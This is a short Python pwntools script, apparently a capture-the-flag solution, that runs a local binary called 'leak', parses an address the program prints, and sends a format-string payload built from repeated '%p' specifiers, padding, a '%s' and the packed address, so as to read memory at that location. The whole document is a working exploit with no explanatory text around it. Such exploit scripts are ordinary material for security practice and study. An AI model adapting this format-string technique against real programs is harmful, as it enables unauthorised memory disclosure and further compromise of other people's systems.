from pwn import*

p = process('./leak')

bufIn = 0x6

p.recvuntil(b'web:\n')
leak = p.recvline()
leak = leak.split(b'|')
print(leak)
leak = leak[2]
leak = int(leak, 16)
leak = p64(leak)

payload = b'%p' * bufIn + b'%p' * 0x2 + b'A' * 0x6 + b'%s' + leak

p.recvuntil(b'>')
p.sendline(payload)

p.interactive()
